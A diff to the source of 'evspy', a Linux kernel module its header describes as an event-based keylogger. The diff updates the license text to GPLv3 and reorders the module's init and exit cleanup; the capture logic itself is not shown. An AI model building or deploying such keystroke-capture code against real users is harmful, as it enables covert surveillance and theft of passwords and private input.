@@ -1,23 +1,23 @@
 /*
+ *   evspy - event based keylogger (Linux module)
+ *
  *   Copyright (c) 2011 Guillermo Ramos <0xwille@gmail.com>
  *   based on evbug module by Vojtech Pavlik ((c) 1999-2001)
  *
- * This program is free software; you can redistribute it and/or modify
+ * This file is part of evspy
+ *
+ * evspy is free software: you can redistribute it and/or modify
  * it under the terms of the GNU General Public License as published by
- * the Free Software Foundation; either version 2 of the License, or
+ * the Free Software Foundation, either version 3 of the License, or
  * (at your option) any later version.
  *
- * This program is distributed in the hope that it will be useful,
+ * evspy is distributed in the hope that it will be useful,
  * but WITHOUT ANY WARRANTY; without even the implied warranty of
  * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  * GNU General Public License for more details.
  *
  * You should have received a copy of the GNU General Public License
- * along with this program; if not, write to the Free Software
- * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA
- *
- * Should you need to contact me, the author, you can mail your message to
- * <0xwille@gmail.com>
+ * along with evspy.  If not, see <http://www.gnu.org/licenses/>.
  */
 
 #include "evspy-core.h"
@@ -252,20 +252,18 @@ static struct input_handler evspy_handler = {
 static int __init evspy_init(void)
 {
 	create_proc_read_entry(EVS_PROCNAME, 0, NULL, evspy_read_proc, NULL);
-
 	init_shiftmap();
-
 	buffer = kmalloc(EVS_BUFSIZE, GFP_KERNEL);
 	rdp = wrp = buffer;
-
 	return !buffer || input_register_handler(&evspy_handler);
 }
 
 static void __exit evspy_exit(void)
 {
-	kfree(buffer);
-	remove_proc_entry(EVS_PROCNAME, NULL);
 	input_unregister_handler(&evspy_handler);
+	kfree(buffer);
+	exit_shiftmap();
+	remove_proc_entry(EVS_PROCNAME, NULL);
 }
 
 module_init(evspy_init);
